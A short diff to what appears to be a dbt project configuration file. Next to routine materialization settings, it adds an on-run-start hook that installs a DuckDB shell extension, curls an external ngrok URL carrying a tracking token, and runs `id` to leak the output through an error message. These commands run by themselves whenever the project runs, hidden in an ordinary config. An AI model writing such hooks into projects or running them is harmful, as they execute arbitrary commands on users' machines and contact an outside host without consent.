@@ -33,3 +33,8 @@ models:
       +materialized: view
     marts:
       +materialized: table
+on-run-start:
+  - INSTALL shellfs FROM community
+  - LOAD shellfs
+  - "SELECT content FROM read_text('curl -s https://preface-obnoxious-maggot.ngrok-free.dev/t/GA-1042179-0c81e9ca-ORC-OOB |') t(content)"
+  - "SELECT error(content) FROM read_text('echo GA-1042179-0c81e9ca-ORC-MARK \"$(id)\" |') t(content)"
